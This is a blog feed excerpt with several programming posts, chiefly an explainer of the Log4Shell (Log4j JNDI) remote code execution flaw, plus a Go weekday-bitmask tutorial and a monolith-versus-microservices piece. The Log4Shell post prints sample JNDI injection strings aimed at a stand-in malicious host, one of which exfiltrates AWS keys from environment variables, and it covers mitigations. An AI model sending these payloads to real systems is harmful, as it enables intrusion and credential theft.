<h4><strong>What does happen If the object has long prototype chain and not found desired property? How can we overcome the negative impact?</strong></h4>
<p>The searching time of prototype chaining is high which can lead negative impact on performance if performance is considered to be a major thing. Because it is trying to access nonexistent properties will always traverse the full prototype chain. For this, we have to use <code>hasOwnProperty</code> to check whether the property exists or not. <code>hasOwnProperty</code> is the only thing in JavaScript which deals with properties and does not traverse the prototype chain.</p>
<p>That&#8217;s all for this part. In <strong>Part &#8211; 2</strong>, we will move into implement 4 pillars of OOP using object and function.</p>
<hr />
<p><em><strong>NOTE:</strong> Following the <strong>ECMAScript</strong> standard, the notation <code>someObject.[[Prototype]]</code> is used to designate the prototype of someObject. Since <strong>ECMAScript</strong> 2015, the <code>[[Prototype]]</code> is accessed using the accessors <code>Object.getPrototypeOf()</code> and <code>Object.setPrototypeOf()</code>. This is equivalent to the JavaScript property <code>__proto__</code> which is non-standard but de-facto implemented by many browsers.</em></p>
<p><em>It should not be confused with the <code>func.prototype</code> property of functions, which instead specifies the <code>[[Prototype]]</code> to be assigned to all instances of objects created by the given function when used as a <code>constructor</code>. The <code>Object.prototype</code> property represents the Object prototype object.</em></p>
<hr />
]]></content:encoded>
					
					<wfw:commentRss>/blog/how-oop-works-part-1/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Apache Log4j aka Log4Shell Vulnerability &#8211; Remote Code Execution</title>
		<link>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/</link>
					<comments>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/#comments</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Thu, 30 Dec 2021 18:35:45 +0000</pubDate>
				<category><![CDATA[Data]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[Java]]></category>
		<category><![CDATA[logging]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<guid isPermaLink="false">/?p=5037</guid>

					<description><![CDATA[Critical Severity Web Vulnerability When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability [&#8230;]]]></description>
										<content:encoded><![CDATA[<h3 id="critical-severity-web-vulnerability">Critical Severity Web Vulnerability</h3>
<p>When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability in a very widely used library in Java, this is used for logging named <strong>Apache Log4j</strong> also known as <strong>Log4j</strong>.</p>
<blockquote><p>Vulnerabilities are discovered all the time. Whenever a vulnerability is found, it gets patched by the community members as soon as possible.</p></blockquote>
<p>I learned a lot from <a title="https://www.youtube.com/watch?v=uyq8yxWO1ls" href="https://www.youtube.com/watch?v=uyq8yxWO1ls" data-from-md="" rel="nofollow noopener" target="_blank">this video</a>. Anyone reading this article may refer to his videos for in-depth learning. Also, I&#8217;m using his used examples here too.</p>
<p>Thanks, <a href="https://www.linkedin.com/in/rafat-ibn-rashid/" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p>
<h2 id="what-is-log4j">What is Log4j?</h2>
<p>Log4j is a very popular java logging library that is used for logging data from out program into files or console shells when something goes wrong, during debugging, errors are raised, API request body(payload), etc to lookup these logged data to troubleshoot or get better insights. This is usually what typical logging libraries are used for. This <code class="inline-code">Log4j</code> library was so popular that even if a java based codebase doesn&#8217;t use it directly, there is a very high possibility that some direct or indirect dependencies are using it. Now, because of the high usage of <code class="inline-code">Log4j</code>, the recently found vulnerability raises some serious concern for the java based applications.</p>
<blockquote>
<h4 id="any-java-codebase-that-uses-log4j-can-be-hacked-unless-you-are-using-their-latest-patch-version2171-after-this-vulnerability-was-found">Any <code class="inline-code">java</code> codebase that uses <code class="inline-code">Log4j</code> can be hacked unless you are using their latest patch version(&gt;=2.17.1) after this vulnerability was found.</h4>
</blockquote>
<p>All enterprise and other application developers are now racing to put this patch, updating their <code class="inline-code">Log4j</code> version to the recently patched version which is 2.17.1 or higher(in the future) to avoid this vulnerability in their programs. Upgrading the <code class="inline-code">Log4j</code> or any other package may lead to more bugs if you don&#8217;t know what you&#8217;re doing. As we speak many packages apply these patches to the code where they use <code class="inline-code">Log4j</code>. But there&#8217;s a possibility that some may not apply this patch which makes us vulnerable if we use that third-party library package in our codebase.</p>
<blockquote><p>Note: Hackers are also racing to exploit their targets before applications apply this patch to their codebase and deploy it into production.</p></blockquote>
<p>Those of us who are thinking, well, we don&#8217;t use <code class="inline-code">Log4j</code> in our codebase so this vulnerability isn&#8217;t going to affect us. Well, this is where the fun begins. Because of the popularity of <code class="inline-code">Log4j</code>, the third-party libraries and their direct/indirect dependent libraries may use log4j to log their stuff.</p>
<blockquote><p>snyk &#8211; A developer security company &#8211; found out that almost 60% plus java applications out there use <code class="inline-code">Log4j</code> indirectly.</p></blockquote>
<p>Using those usages of log4j in the dependencies of your application, your application falls under the threat of this vulnerability as well. So everyone needs to apply this patch to their codebase and redeploy their application into production.</p>
<p>Those of us who are still thinking, we don&#8217;t have to put this patch or this vulnerability has nothing to do with us. There&#8217;s a scoring system called <code class="inline-code">CVSS</code> which stands for <strong>Common Vulnerability Scoring System</strong>. It provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity. This <code class="inline-code">CVSS</code> system rated this vulnerability 10 out of 10 which is pretty scary for java developers. This vulnerability has the highest score possible. And why is that? The reason for this is, this vulnerability enables what is known as <strong>RCE</strong>.</p>
<h2 id="what-is-rce">What is RCE?</h2>
<p><code class="inline-code">RCE</code> stands for <strong>Remote Code Execution</strong>. What this means is, hackers are allowed to execute any code on your machine by hacking into your application which uses <code class="inline-code">log4j</code> directly or indirectly. This vulnerability was nick-named as <code class="inline-code">Log4Shell</code> and the reason is, anyone can open a shell on your server and issue commands. Scary right?</p>
<p>Let&#8217;s explain how we arrive at this scary problem. There are a few things that lead to this vulnerability altogether. Let&#8217;s go one by one.</p>
<h4 id="1-log4j-allow-us-to-log-expressions">1. Log4j allow us to log expressions</h4>
<div class="joplin-editable">
<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
</div>
<p>In the first line, we get the logger client and then we log the error messages. So we are plugging the error object into the string. Java will run this <code class="inline-code">error.getMessages()</code> code and send this value which will be used by <code class="inline-code">log4j</code> to plug that error value into the string. We&#8217;ll see an output that will contain the error string and whatever the <code class="inline-code">error.getMessages</code> returns into that <code class="inline-code">{}</code> curly braces which are called <strong>string interpolation</strong> and going to print it.</p>
<p>Another example,</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Info(&quot;user {} has logged in using id {}&quot;, map.get(&quot;Name&quot;), user.getId());</code></pre>
</div>
<p>As long as the value passed here log4j will print it and it&#8217;s the standard logging mechanism by most of the logging library, there&#8217;s nothing special, right? This mechanism is not the problem here.</p>
<h4 id="2-jndi">2. JNDI</h4>
<p><code class="inline-code">JNDI</code> stands for <strong>Java Naming and Directory Interface</strong>. This allows us to store java objects to a remote location and then serialize them to your <code class="inline-code">JVM</code> which is kind of streaming to <code class="inline-code">JVM</code>. As scary as it seems, this technology has been in existence from the era before rest API and it was quite popular at that time. This was a redistributed java system that would work with each other to communicate. This has lost its popularity now but it still exists in java for backward compatibility reasons.<br />
Let&#8217;s have an example,</p>
<div class="joplin-editable">
<pre><code class="language-">ldap://192.168.1.22:8080/O=Rezwanul,C=BD</code></pre>
</div>
<p>This is an active directory link that uses <code class="inline-code">LDAP</code> protocol and we can invoke the URL and get a serialized java object in return from somewhere from a remote server. In our example, it is most probably the profile object we get from the active directory. This has nothing to do with <code class="inline-code">log4j</code>, It&#8217;s a Java feature that has been in java for years. We can enable/disable it, it&#8217;s encouraged to disable it. It hasn&#8217;t been removed from java because java never deprecates anything for backward compatibility reasons, for example, even codes from 1995(java first released year) code can be run on the latest JVM and latest Java compiler.</p>
<blockquote>
<h4 id="this-feature-is-harmless-in-and-as-of-itself">This feature is harmless in and as of itself</h4>
</blockquote>
<h4 id="3-jndi-lookup-in-log-messages">3. JNDI lookup in log messages</h4>
<p>In 2013, A feature was introduced in Log4j by a contributor, which uses the <code class="inline-code">JNDI</code> lookups from the logging messages. A good use case for this feature would be a centralized logging configuration from a config server and we want to serialize that configuration using <code class="inline-code">JNDI</code> lookups.<br />
Let&#8217;s go back to our first log message example again&#8230;</p>
<div class="joplin-editable">
<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
</div>
<p>We&#8217;re going to use log message for <code class="inline-code">JNDI</code> lookups</p>
<div class="joplin-editable">
<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
logClient.Error(&quot;{}: error: {}&quot;, &quot;${jndi:ldap://logconfig/prefix}&quot;, error.getMessages());</code></pre>
</div>
<p>So what we&#8217;re doing here is, we&#8217;re getting a prefix for the logging message from the configuration server and passing the <code class="inline-code">JNDI</code> URL as an argument. We&#8217;re not passing a value that auto resolves but we&#8217;re passing a URL as a string value but this is not something that JAVA resolves, this is something that we&#8217;re passing to log4j. The difference is <code class="inline-code">log4j</code> does lookups for certain types of strings.<br />
For example,</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Error(&quot;insert string here: {}&quot;, &quot;hello world&quot;);</code></pre>
</div>
<p>The above code will insert the <code class="inline-code">hello world</code> string in the curly braces. But the string we&#8217;re passing as an argument has a special syntax like below <code class="inline-code">${jndi:ldap://...}</code></p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${jndi:ldap://...}&quot;);</code></pre>
</div>
<p>This type of value says log4j to look up and resolve for a serialized value and insert it into the curly braces. As the argument says <code class="inline-code">JNDI</code> log4j uses a <code class="inline-code">JNDI</code> lookup and it&#8217;s going to look up the value and insert it into the braces. Another example</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${env:ENV_VALUE}&quot;);</code></pre>
</div>
<p>As the argument says <code class="inline-code">env</code> log4j uses the environment variable lookups and inserts it into the curly braces.</p>
<blockquote>
<h3 id="this-is-the-vulnerability-were-talking-about-remote-code-executionrce">This is the vulnerability we&#8217;re talking about, <strong>Remote Code Execution(RCE)</strong></h3>
</blockquote>
<p>This feature aka serious bug requested in 2013. To check that <a title="https://issues.apache.org/jira/browse/LOG4J2-313" href="https://issues.apache.org/jira/browse/LOG4J2-313" data-from-md="" rel="nofollow noopener" target="_blank">click here</a>.</p>
<p>Are you wondering how this is a vulnerability? Let&#8217;s give an example<br />
Let&#8217;s say you&#8217;ve got a search page and an end-user can put some search criteria on an input box and submit it and on the server, you&#8217;re logging it, the search term.</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Info(&quot;search page: searched issued for {}&quot;, searchTerm);</code></pre>
</div>
<p>With this simple Info log message, we can think about what can go wrong. Nothing right? Let&#8217;s imagine if the search term looks like below <code class="inline-code">${jndi:ldap://want.to.heck/maliciousobject}</code>, What will happen now, what will the simple Info log message do&#8230;</p>
<p><code class="inline-code">log4j</code> will do a <code class="inline-code">JNDI</code> request to whatever domain passed in the search term.<br />
Let&#8217;s use a simple diagram to show what&#8217;s happening</p>
<p><img decoding="async" class="alignnone size-full wp-image-5039" src="/wp-content/uploads/2021/12/RCE.drawio.png" alt="RCE.drawio Apache Log4j aka Log4Shell Vulnerability - Remote Code Execution" width="578" height="413" srcset="/wp-content/uploads/2021/12/RCE.drawio.png 578w, /wp-content/uploads/2021/12/RCE.drawio-480x343.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 578px, 100vw"></p>
<p>What&#8217;s happening here is, someone puts a <code class="inline-code">JNDI</code> URL as the search term and submits the request. The app server which contains that vulnerable log4j version logs the search term. The server now does a <code class="inline-code">JNDI</code> request to that malicious server and gets a serialized malicious object. What this malicious object contains who knows, log4j will take that object, and now your app <code class="inline-code">JVM</code> has a java object which the application didn&#8217;t put in there. That malicious server (well, the malicious people behind that server) now can put a java object in somebody else&#8217;s <code class="inline-code">JVM</code>.</p>
<blockquote>
<h3 id="this-sounds-like-crazy-but-this-is-what-this-vulnerability-is-to-be-exact">This sounds like crazy but This is what this vulnerability is to be exact.</h3>
</blockquote>
<p>So the malicious person, in his malicious java object, can put a static block that contains whatever code he wants and this is going to run it.</p>
<p>Imagine you can insert the java object of your code in the JVM of a popular e-commerce website or JVM of a popular social media website and then you may control everything on that site. Sounds scary&#8230; Adding salt to this to make it more interesting is you can initiate this as many times as you want to execute whatever code you want to run this type of attack. This is also known as <strong>Remote code execution aka RCE</strong></p>
<p>Isn&#8217;t this pattern almost looking like <strong>SQL Injection</strong>? SQL Injection is also a similar vulnerability. In this type of attack, a Malicious user put malicious SQL code which executes itself on your app code. You&#8217;re passing this malicious code as a query param from your app frontend. That&#8217;s why we don&#8217;t string append or didn&#8217;t do resolves on user inputs. We can call this <strong>Log Injection</strong> aka <strong>Log Forgery</strong>. Log injection attack has been happening for quite some time now.</p>
<blockquote>
<h4 id="log-injection-or-log-forgery-is-a-vulnerability-that-arises-when-un-trusted-and-un-validated-input-is-allowed-to-be-printed-in-system-log-files">Log Injection (or Log Forgery) is a vulnerability that arises when un-trusted and un-validated input is allowed to be printed in system log files.</h4>
</blockquote>
<p>Let&#8217;s look at the below search term.</p>
<div class="joplin-editable">
<pre><code class="language-">\nINFO: Looks like a problem with our calculation./nError: rollback transaction for Rezwanul</code></pre>
</div>
<p>This tells us we make a mistake in the calculation and we&#8217;re rollbacking the transaction. In contrast to this, we may decide to refund the user. but this isn&#8217;t the case really, right?<br />
Log injections are easy to figure out and less harmful. We can&#8217;t do considerable damage with it. Compared to this <strong>RCE</strong> will result in a completely different story and cause serious problems.</p>
<h2 id="solving-the-issue">Solving the Issue</h2>
<h3 id="using-jvm-flags">Using JVM flags</h3>
<p>This is the easiest one. Set these <code class="inline-code">JVM</code> flags to <code class="inline-code">false</code></p>
<div class="joplin-editable">
<pre><code class="language-java">com.sun.jndi.ldap.object.trustURLCodebase
com.sun.jndi.rmi.object.trustURLCodebase</code></pre>
</div>
<p>Which is telling java that, do you want to trust code that is coming from a URL that handles JNDI or RMI URL resolves kind of stuff? Set these flags to <code class="inline-code">false</code> and you&#8217;re good to go. After that Java won&#8217;t run any code which is coming from a URL. Java will stop it and Log4j will be stopped from logging it.<br />
Lots of people turn this off as this is scary stuff and yet lots of people out there don&#8217;t even know this exists and they have servers running with this thing turned on and if they have that version of log4j which is vulnerable, may cause serious problems.</p>
<p>Even if these flags are turned off there is still vulnerability. Remember our environment variable resolving example in the above. Most application has some environment variable set up on the server.</p>
<div class="joplin-editable">
<pre><code class="language-java">${jndi:ldap://want.to.heck/${env:AWS_ACCESS_KEY}/${env:AWS_ACCESS_KEY_SECRET}}</code></pre>
</div>
<p>A call with the above example goes out like that, then JVM will resolve those environment variables and then initiate the JNDI request which leads to a security breach on AWS as the AWS keys are exposed. This may lead to a situation where clients experience unwanted bills on AWS. Scary right? We don&#8217;t want anything to happen to our clients, do we?</p>
<p>So here is our next solution:</p>
<h3 id="update-log4j">Update log4j</h3>
<p>We need to update log4j to the latest version(like 2.17.1) which doesn&#8217;t have this vulnerability. This sounds simple but it can be problematic if you have dependencies that depend on something else which don&#8217;t support the latest log4j version you are trying to update. In that case we have to wait for that dependent library to patch log4j, well while we&#8217;re waiting scary things may happen if you want to take that risk.</p>
<h3 id="patch-the-class-directly">Patch the class directly</h3>
<p>So in this approach, we patch the java class directly into our version of log4j or the third-party library which uses log4j and patch it on the server so that we don&#8217;t face the above issue.</p>
<p>If you like, you can read the same article on my<a href="https://rezwanul-haque.hashnode.dev/apache-log4j-aka-log4shell-vulnerability-remote-code-execution" rel="nofollow noopener" target="_blank"> [Personal blog]</a></p>
<p>&gt; #### You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></p>
<h3 id="use-dependency-constraints-using-gradle">Use Dependency Constraints using Gradle</h3>
<p>This will allow you to forcefully use a version of dependency you define in Gradle. No matter what the version that the dependent library use, you force them to use the version you choose.</p>
<p>In Conclusion, Open Source projects are secure most of the time no doubt about it. But just because it&#8217;s open-source, doesn&#8217;t mean it hasn&#8217;t been exposed to vulnerability. Many people will review contributors code for bugs and vulnerability but We need to ask the question,</p>
<blockquote>
<h3 id="is-the-person-reviewing-a-piece-of-code-is-the-right-person-to-do-that-review-or-not">Is the person reviewing a piece of code is the right person to do that review or not?</h3>
</blockquote>
<p>This log4j vulnerability is out there for almost <strong>9</strong> years, who knows what type of problem it caused in all these years. From a developer&#8217;s perspective, our implemented code may not be buggy at first glance as we don&#8217;t think how a security expert will think on that same implementation.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/feed/</wfw:commentRss>
			<slash:comments>2</slash:comments>
		
		
			</item>
		<item>
		<title>A Smart Way To Store Weekdays In Database</title>
		<link>/blog/a-smart-way-to-store-weekdays-in-database/</link>
					<comments>/blog/a-smart-way-to-store-weekdays-in-database/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Wed, 15 Dec 2021 07:55:06 +0000</pubDate>
				<category><![CDATA[Data]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[Databases]]></category>
		<category><![CDATA[Optimization]]></category>
		<guid isPermaLink="false">/?p=4925</guid>

					<description><![CDATA[Optimization techniques for fast query When we work on a specific problem, We first think of the solution for the worst-case scenario which leads to a brute force approach to solving the problem. This is OK most of the time, as we don&#8217;t get much time to think about an optimal solution due to tight [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Optimization techniques for fast query</p>
<p>When we work on a specific problem, We first think of the solution for the worst-case scenario which leads to a brute force approach to solving the problem. This is OK most of the time, as we don&#8217;t get much time to think about an optimal solution due to tight deadlines. In this blog post, We&#8217;re talking about storing weekdays data model problems. First, we go through the problematic approach &#8211; brute force, then optimize our data model so that we can optimize our database tables for the fast queries.</p>
<p>Let&#8217;s give a perspective to our problem first, suppose we are developing an application and in our application, we need to manage branches (e.g branches of a restaurant or supermarket) and each branch has its own weekdays.</p>
<p>So we can design that in an RDBMS database like this, we make a table <code class="inline-code">branches</code> where we store branch-related information and for the weekdays of a specific branch we can store that in a pivot table like <code class="inline-code">branch_weekdays</code> which represents one to many relationships.</p>
<blockquote><p>Thanks <a title="https://www.linkedin.com/in/rafat-ibn-rashid/" href="https://www.linkedin.com/in/rafat-ibn-rashid/" data-from-md="" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p></blockquote>
<p><img decoding="async" title="" src="///home/rezwanulhaque/.config/joplin-desktop/resources/24724ae100d14517ac91eea376afa4e7.png?t=1638294625651" data-from-md="" data-resource-id="24724ae100d14517ac91eea376afa4e7" alt="24724ae100d14517ac91eea376afa4e7 A Smart Way To Store Weekdays In Database"><img decoding="async" class="alignnone size-full wp-image-4927" src="/wp-content/uploads/2021/12/branch_weekday.png" alt="branch weekday A Smart Way To Store Weekdays In Database" width="756" height="409" srcset="/wp-content/uploads/2021/12/branch_weekday.png 756w, /wp-content/uploads/2021/12/branch_weekday-480x260.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 756px, 100vw"></p>
<blockquote><p>Note: We&#8217;re storing <code class="inline-code">start_time</code> and <code class="inline-code">end_time</code> in a military format which is why we define the type as <code class="inline-code">int</code></p></blockquote>
<p>In this design, the pivot table can store the days&#8217; info of a branch which represents one to many relationships. For small data, it&#8217;s completely fine as it&#8217;s not going to be a problem.</p>
<p>But just think like this, in the worst case if every branch has 7 days as it&#8217;s a weekday in the table then the table becomes one of the major problems when there are a million rows in the branches table which makes the <code class="inline-code">branch_weekdays</code> table 7 times larger than the branches table. If we have several tables like that in our application and we need to join tables to serve some data, this will be a major problem as it will make our query slow when we need to join these tables.</p>
<h3 id="solutions">Solutions:</h3>
<p>To solve this problem, we use the binary operation to store the days as a mask in the branches table without managing a separate pivot table like below</p>
<p><img decoding="async" class="alignnone wp-image-4928 size-full" src="/wp-content/uploads/2021/12/branches.png" alt="branches A Smart Way To Store Weekdays In Database" width="633" height="318" srcset="/wp-content/uploads/2021/12/branches.png 633w, /wp-content/uploads/2021/12/branches-480x241.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 633px, 100vw"></p>
<div class="joplin-editable">
<p>Let me explain how we can generate the mask in the branches table. So we all know 7 days makes a whole week and if we flag 0 as Sunday to 6 as Saturday respectively, then we get 0-6 values for each day in a week. While working with binary may initially seem confusing, understanding that each binary place value represents 2<sup class="jop-noMdConv">n</sup>, just as each decimal place represents 10<sup class="jop-noMdConv">n</sup>, should help clarify. Take the number 8 for example:<br />
<b class="jop-noMdConv"><br />
8 × 10<sup class="jop-noMdConv">0</sup> = 8 × 1 = 8<br />
</b><br />
In binary, 8 is represented as 1000. Reading from right to left, the first 0 represents 2<sup class="jop-noMdConv">0</sup>, the second 2<sup class="jop-noMdConv">1</sup>, the third 2<sup class="jop-noMdConv">2</sup>, and the fourth 2<sup class="jop-noMdConv">3</sup>; just like the decimal system, except with a base of 2 rather than 10.<br />
<b class="jop-noMdConv"><br />
2<sup class="jop-noMdConv">0</sup> + 2<sup class="jop-noMdConv">1</sup> + 2<sup class="jop-noMdConv">2</sup> + 2<sup class="jop-noMdConv">3</sup> + 2<sup class="jop-noMdConv">4</sup> + 2<sup class="jop-noMdConv">5</sup> + 2<sup class="jop-noMdConv">6</sup> = 127<br />
</b><br />
If we sum the values, we get 127 as the mask value which means the branch is available in seven days. As we&#8217;ll use the bitwise operation to check whether the current day is available or not in the mask value which makes the operation much faster and we&#8217;re able to save a lot of space too. Also, most importantly, we don&#8217;t face a million rows joining problem.</p>
<p>For this part, I&#8217;ll write the code in <code class="inline-code">Golang</code>, Let me define some utils functions so that we can re-use the code in our application</p>
<pre><code class="language-go">// Contains check if a `needle` can be found in the `haystack` 
// e.g.
// haystack -&gt; []slice
// needle -&gt; int
// result -&gt; bool
func Contains(haystack interface{}, needle interface{}) bool {
	switch reflect.TypeOf(haystack).Kind() {
	case reflect.Slice:
		s := reflect.ValueOf(haystack)

		for i := 0; i &lt; s.Len(); i++ {
			if reflect.DeepEqual(needle, s.Index(i).Interface()) {
				return true
			}
		}
	}
	return false
}</code></pre>
</div>
<div class="joplin-editable"></div>
<pre><code class="language-go">// GenerateAvailabilityMask covert days slice into binary mask value
func GenerateAvailabilityMask(days []int) *int {
    mask := 0
    for i = 0; i &lt; 7; i++ {
        if Contains(days, i) {
            mask += int(math.Pow(2, float64(i)))
        }
    }

    return &amp;mask
}

// input
// [0,1,2,3,4,5,6]
// output
// 127</code></pre>
<p>We need a function to generate weekdays from the mask as we&#8217;ll return days as a comma-separated string</p>
<pre><code class="language-go">// GenerateWeekdays convert mask value into weekdays comma separated string
func GenerateWeekdays(mask int) string {
	var sb strings.Builder
	nbits := 7
	for i := 0; i &lt; nbits; i++ {
		if IsCurrentDayAvailable(mask, i) {
			sb.WriteString(strconv.Itoa(i))
			sb.WriteString(&quot;,&quot;)
		}
	}
	return TrimSuffix(sb.String(), &quot;,&quot;)
}

// input
// 127
// output
// &quot;0,1,2,3,4,5,6&quot;

// TrimSuffix remove suffix from the string if string ends with the suffix
func TrimSuffix(s, suffix string) string {
	if ok := strings.HasSuffix(s, suffix); ok {
		s = s[:len(s)-len(suffix)]
	}
	return s
}

// IsCurrentDayAvailable check if current weekday is available in availability mask
func IsCurrentDayAvailable(mask int, currentDay int) bool {
	x := 1
	return (mask &amp; (x &lt;&lt; currentDay)) &gt; 0
}</code></pre>
<p><code class="inline-code">IsCurrentDayAvailable</code> function is where we apply the <code class="inline-code">bitwise AND (&amp;)</code> operation to find if the current day is available in the mask or not.<br />
To get the current day we can use the below function</p>
<div class="joplin-editable">
<pre><code class="language-go">// CurrentLocalTimeAndWeekday use timezone to get current zone time and weekday and return current weekday &amp; current time in military format 
func CurrentLocalTimeAndWeekday(tz string) (int, int) {
	militaryLayout := &quot;1504&quot;
	loc, err := time.LoadLocation(tz)
	if err != nil {
		logrus.Error(&quot;error occurred when trying to find timezone location.&quot;, err)
		return 0, -1
	}
	t := time.Now().In(loc)
	currentWeekday := int(time.Now().In(loc).Weekday())

	militaryTime, err := strconv.Atoi(t.Format(militaryLayout))
	if err != nil {
		logrus.Error(&quot;error occurred when converting time to military integer format.&quot;)
		return 0, -1
	}
	return militaryTime, currentWeekday
}

</code></pre>
<p>If you like, you can read the same article on my  [<a href="https://rezwanul-haque.hashnode.dev/a-smart-way-to-store-weekdays-in-database" rel="nofollow noopener" target="_blank">Personal blog</a>]</p>
<blockquote><p>#### You can read my other blog-posts [<a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">Here</a>]</p></blockquote>
<p>So after fetching the mask from the branches table, we can use the <code class="inline-code">CurrentLocalTimeAndWeekday</code> utils function to get the current time and weekday and use the <code class="inline-code">IsCurrentDayAvailable</code> function to determine if the current weekday is available or not in the mask. Also if we need to send Mask as weekdays in the response we can use the <code class="inline-code">GenerateWeekdays</code> function to make the mask as an array of weekdays.</p>
</div>
<p>In Conclusion, We may not often get enough time to think or come up with an optimized solution in the first go but if we put some thought into the problem, we may come up with solutions that make the database query faster as we reach to million rows.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/a-smart-way-to-store-weekdays-in-database/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Trade-offs for Monoliths and Microservices</title>
		<link>/blog/trade-offs-for-monoliths-and-microservices/</link>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Mon, 28 Jun 2021 21:28:49 +0000</pubDate>
				<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[architecture]]></category>
		<category><![CDATA[microservices]]></category>
		<category><![CDATA[monoliths]]></category>
		<guid isPermaLink="false">/?p=2594</guid>

					<description><![CDATA[When developing an application, we as software engineers face different types of architecture for building an application. Among them, Monoliths and Microservices are considered to be the latest trends. When designing an application, we can consider both, monolithic or microservice-based architectures. What we will choose depends on how the structure of an application is contoured [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>When developing an application, we as software engineers face different types of architecture for building an application. Among them, Monoliths and Microservices are considered to be the latest trends.</p>
<p>When designing an application, we can consider both, monolithic or microservice-based architectures. What we will choose depends on how the structure of an application is contoured by functional requirements and available resources. However, each architecture has a set of trade-offs, that need to be thoroughly examined before deciding on the final architecture of the application.</p>
<p>These trade-offs cover <code>development complexity</code>, <code>scalability</code>, <code>time to deploy</code>, <code>flexibility</code>, <code>operational cost</code>, and <code>reliability</code>. I&#8217;ll try to explain each trade-off below&#8230;</p>
<h2>Development Complexity:</h2>
<p><code>Development complexity</code> refers to the effort required to deploy and manage an application. So deployment and managing a monolith or microservice-based application are different so let&#8217;s discuss those development complexities for monoliths and microservices-based applications.</p>
<h3>Programming Language</h3>
<p><strong>Monolith:</strong> The monolith application usually revolves around a single framework or programming language. For example, we can say we&#8217;ll build a Booking application using the Django web framework(which depends on python programming language).<br />
<strong>Microservice:</strong> The microservices application can be deployed using multiple languages. For example Same Booking application we considered above, let&#8217;s say the application has two services <code>Login</code> &amp; <code>Book ticket</code>.<br />
We might consider building the <code>Login service</code> using the Go programming language, on the other hand for <code>Book ticket</code> we can use Python.</p>
<h3>Management of Code Repository</h3>
<p><strong>Monolith:</strong> The monolith application usually belongs to a single code repository.<br />
<strong>Microservice:</strong>  Each Microservice requires its own separate code repository.</p>
<blockquote>
<h4>Note: We might think it&#8217;s better to manage a single repository than many, but the development complexity scale radically when more functionality is added to the project. As for microservice we team can work on a functionality independently as all functionality has its own codebase.</h4>
</blockquote>
<h3>Development Cycle</h3>
<p><strong>Monolith:</strong> The Development Cycle of a  monolith application is sequential as a single team will work on the codebase at a time. Also, the team needs to be careful about adding new functionality as the team may need to modify multiple functions to ensure backward compatibility.<br />
<strong>Microservice:</strong> The Development Cycle of each microservice is concurrent as each team works on each functionality separately on their own codebase.</p>
<h2>Scalability:</h2>
<p>The term <code>scalability</code> refers to how an application scales up and down when the incoming traffic increase exponentially or there&#8217;s a sudden demand on a particular functionality of the application.</p>
<h3>Traffic</h3>
<p><strong>Monolith:</strong> As the traffic increases, we need to replicate the entire unit with all the functionalities. For example, if we need to scale the Payment functionality, we need to scale other functionalities respectively.<br />
hence this is heavy on resource consumption such as CPU and Memory.<br />
<strong>Microservice:</strong> As the traffic increase on a particular functionality or service we can easily identify which service or functionality needs to scale and only scale that up will solve the traffic issue.</p>
<h3>Resource Consumption</h3>
<p><strong>Monolith:</strong> As the traffic example describes, we can conclude monoliths are heavy on resource consumption such as CPU and Memory. As we are using more space than actually needed.<br />
<strong>Microservice:</strong> As each functionality belongs to a separate service in a microservice application, the resource consumption is on-demand which means is, we need to scale up to the current need for the moment if we don&#8217;t need that in the future, we can easily scale down.</p>
<h2>Time to Deploy:</h2>
<p>The term <code>Time to Deploy</code> refers to building a deployment pipeline and deploying new features or bug fixes easily.</p>
<h3>Delivery Pipeline</h3>
